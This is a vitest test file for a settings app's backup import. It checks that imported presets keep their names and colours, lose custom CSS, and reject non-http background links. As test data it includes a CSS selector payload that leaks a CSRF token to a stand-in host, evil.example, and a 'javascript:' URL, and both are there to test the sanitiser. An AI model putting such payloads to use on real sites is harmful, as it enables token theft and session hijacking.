/**
 * Saved Customize presets in a backup file. The shape check only knew lists
 * of strings, so every import dropped the presets an export had written.
 * They come back now, through the Customize sanitiser, without their custom
 * CSS (the rule theme codes follow): a stylesheet in a friendly-named preset
 * of someone else's file would apply on Apply, past the import's custom CSS
 * question.
 */
import { describe, it, expect } from "vitest";
import {
  exportableSettings,
  sanitizeBackup,
  sanitizeBackupPresets,
  unwrapBackup,
  wrapBackup,
} from "../src/features/hub/backup.ts";

const EVIL_CSS =
  "meta[name=csrf-token][content^=a]{display:block;background:url(https://evil.example/a)}";

describe("presets in a backup", () => {
  it("survive an export and an import", () => {
    const presets = [
      { name: "Night", values: { CUSTOM_ACCENT_COLOR: "#123456", CUSTOM_ACCENT_ENABLED: true } },
      { name: "Day", values: { CUSTOM_ACCENT_COLOR: "#abcdef" } },
    ];
    const file = JSON.parse(
      JSON.stringify(wrapBackup(exportableSettings({ CUSTOM_PRESETS: presets }), "test")),
    );
    const restored = sanitizeBackup(unwrapBackup(file).settings).CUSTOM_PRESETS as {
      name: string;
      values: Record<string, unknown>;
    }[];
    expect(restored.map((p) => p.name)).toEqual(["Night", "Day"]);
    expect(restored[0].values.CUSTOM_ACCENT_COLOR).toBe("#123456");
    expect(restored[0].values.CUSTOM_ACCENT_ENABLED).toBe(true);
  });

  it("lose their custom CSS, and keep the rest", () => {
    const out = sanitizeBackup({
      CUSTOM_PRESETS: [
        { name: "Dracula", values: { CUSTOM_CSS: EVIL_CSS, CUSTOM_ACCENT_COLOR: "#ff79c6" } },
      ],
    });
    const [preset] = out.CUSTOM_PRESETS as { name: string; values: Record<string, unknown> }[];
    expect(preset.name).toBe("Dracula");
    expect(preset.values.CUSTOM_CSS).toBe("");
    expect(preset.values.CUSTOM_ACCENT_COLOR).toBe("#ff79c6");
    expect(JSON.stringify(out)).not.toContain("evil.example");
  });

  it("drop a background link that is not plain http(s)", () => {
    const [preset] = sanitizeBackupPresets([
      { name: "X", values: { CUSTOM_PAGE_BG_URL: "javascript:alert(1)" } },
    ])!;
    expect(preset.values.CUSTOM_PAGE_BG_URL).toBe("");
    const [kept] = sanitizeBackupPresets([
      { name: "Y", values: { CUSTOM_PAGE_BG_URL: "https://i.example/bg.png" } },
    ])!;
    expect(kept.values.CUSTOM_PAGE_BG_URL).toBe("https://i.example/bg.png");
  });

  it("keep the presets module's limits: 20 presets, 40-character names, one per name", () => {
    const many = Array.from({ length: 30 }, (_, i) => ({ name: `P${i}`, values: {} }));
    expect(sanitizeBackupPresets(many)).toHaveLength(20);
    const [long] = sanitizeBackupPresets([{ name: `  ${"n".repeat(60)}  `, values: {} }])!;
    expect(long.name).toBe("n".repeat(40));
    const dupes = sanitizeBackupPresets([
      { name: "A", values: {} },
      { name: " A ", values: {} },
    ])!;
    expect(dupes).toHaveLength(1);
  });

  it("skip what is not a preset instead of refusing the file", () => {
    const out = sanitizeBackupPresets([
      "Night",
      null,
      [],
      { name: 42, values: {} },
      { name: "   ", values: {} },
      { name: "Ok", values: "garbage" },
    ])!;
    expect(out.map((p) => p.name)).toEqual(["Ok"]);
    expect(sanitizeBackupPresets("not a list")).toBeNull();
    expect(sanitizeBackup({ CUSTOM_PRESETS: "not a list" })).not.toHaveProperty("CUSTOM_PRESETS");
  });
});
